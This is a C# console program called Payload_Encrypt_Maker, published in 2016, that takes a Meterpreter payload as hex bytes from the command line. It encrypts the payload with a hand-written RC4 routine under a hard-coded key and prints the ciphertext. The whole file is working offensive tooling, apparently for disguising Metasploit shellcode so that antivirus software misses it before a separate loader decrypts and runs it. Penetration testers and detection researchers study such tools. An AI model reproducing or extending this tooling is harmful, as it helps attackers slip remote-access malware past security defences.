using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

// General Information about an assembly is controlled through the following 
// set of attributes. Change these attribute values to modify the information
// associated with an assembly.
[assembly: AssemblyTitle("Payload_Encrypt_Maker")]
[assembly: AssemblyDescription("Publisher and Author: Damon mohammadbagher")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Payload_Encrypt_Maker")]
[assembly: AssemblyCopyright("Copyright ©  2016")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// Setting ComVisible to false makes the types in this assembly not visible 
// to COM components.  If you need to access a type in this assembly from 
// COM, set the ComVisible attribute to true on that type.
[assembly: ComVisible(false)]

// The following GUID is for the ID of the typelib if this project is exposed to COM
[assembly: Guid("097ba4a7-7b6d-4fbb-8a7b-2c84af6b8a1f")]

// Version information for an assembly consists of the following four values:
//
//      Major Version
//      Minor Version 
//      Build Number
//      Revision
//
// You can specify all the values or you can default the Build and Revision Numbers 
// by using the '*' as shown below:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace Payload_Encrypt_Maker
{ class Program
    {

        static byte[] KEY = { 0x11, 0x22, 0x11, 0x00, 0x00, 0x01, 0xd0, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x11, 0x01, 0x11, 0x11, 0x00, 0x00 };
       
      
        private static class Encryption_Class
        {
            public static string Encrypt(string key, string data)
            {
                Encoding unicode = Encoding.Unicode;
                return Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));
            }

            public static string Decrypt(string key, string data)
            {
                Encoding unicode = Encoding.Unicode;
                return unicode.GetString(Encrypt(unicode.GetBytes(key), Convert.FromBase64String(data)));
            }

            public static byte[] Encrypt(byte[] key, byte[] data)
            {
                return EncryptOutput(key, data).ToArray();
            }

            public static byte[] Decrypt(byte[] key, byte[] data)
            {
                return EncryptOutput(key, data).ToArray();
            }

            private static byte[] EncryptInitalize(byte[] key)
            {
                byte[] s = Enumerable.Range(0, 256)
                  .Select(i => (byte)i)
                  .ToArray();

                for (int i = 0, j = 0; i < 256; i++)
                {
                    j = (j + key[i % key.Length] + s[i]) & 255;

                    Swap(s, i, j);
                }

                return s;
            }

            private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
            {
                byte[] s = EncryptInitalize(key);

                int i = 0;
                int j = 0;

                return data.Select((b) =>
                {
                    i = (i + 1) & 255;
                    j = (j + s[i]) & 255;

                    Swap(s, i, j);

                    return (byte)(b ^ s[(s[i] + s[j]) & 255]);
                });
            }

            private static void Swap(byte[] s, int i, int j)
            {
                byte c = s[i];

                s[i] = s[j];
                s[j] = c;
            }
        }
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Payload Encryption tool for Meterpreter Payloads ");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Published by Damon Mohammadbagher  2016-2017");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine();
            Console.WriteLine("[!] Using RC4 Encryption for your Payload");            
            

            string[] InputArg = args[0].Split(',');
            byte[] XPay = new byte[InputArg.Length];

            Console.WriteLine("[!] Detecting Meterpreter Payload by Arguments");
            Console.Write("[!] Payload Length is: ");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write(XPay.Length.ToString() + "\n");
            Console.ForegroundColor = ConsoleColor.DarkGreen;

            for (int i = 0; i < XPay.Length; i++)
            {
                XPay[i] = Convert.ToByte(InputArg[i], 16);
            }

            Console.WriteLine("[!] Loading Meterpreter Payload in Memory Done.");

            byte[] Xresult = Encryption_Class.Encrypt(KEY, XPay);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[>] Encrypting Meterpreter Payload in Memory by KEY Done.");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write("[!] Encryption KEY is:");
            Console.ForegroundColor = ConsoleColor.Yellow;

            string Keys = "";
            foreach (byte item in KEY)
            {
                Keys += item.ToString("x2") + " ";
            }

            Console.Write(" {0}", Convert.ToString(Keys));
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.WriteLine("[+] Encrypted Payload with Length {0} is: ",XPay.Length.ToString());
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine();
            
            for (int i = 0; i < Xresult.Length; i++)
            {                 
                Console.Write(" "+Xresult[i].ToString());
            }
            Console.WriteLine();
            Console.WriteLine();
            
        

        }
    }
}
